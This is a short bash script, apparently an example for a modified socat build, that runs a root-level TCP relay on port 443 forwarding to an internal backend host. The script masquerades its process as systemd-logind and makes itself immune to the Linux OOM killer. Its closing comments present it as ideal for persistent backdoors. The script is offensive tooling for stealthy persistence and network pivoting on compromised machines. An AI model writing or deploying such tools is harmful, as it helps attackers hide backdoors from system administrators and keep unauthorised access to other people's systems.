#!/bin/bash
# OOM-immune persistent relay example
# Process will not be killed by Linux OOM killer under memory pressure

CONDUIT="${CONDUIT:-./socat-repo/conduit}"

if [ "$EUID" -ne 0 ]; then
    echo "ERROR: OOM immunity requires root privileges"
    echo "Usage: sudo $0"
    exit 1
fi

echo "OOM-Immune Persistent Relay"
echo "Masquerading as: systemd-logind"
echo "OOM immunity: ENABLED"
echo "Port forward: localhost:443 -> backend:443"
echo ""
echo "This process will survive OOM killer during memory pressure"
echo ""

"$CONDUIT" -Ms -Mo \
    TCP-LISTEN:443,fork,reuseaddr \
    TCP:backend.internal:443

# Usage:
# 1. Must run as root
# 2. Run: sudo ./oom-immune-relay.sh
# 3. Process will have oom_score_adj set to -1000
#
# Benefits:
# - Survives system memory pressure
# - Ideal for persistent backdoors/relays
# - Won't be randomly killed during low-memory conditions
# - Critical infrastructure processes use this technique
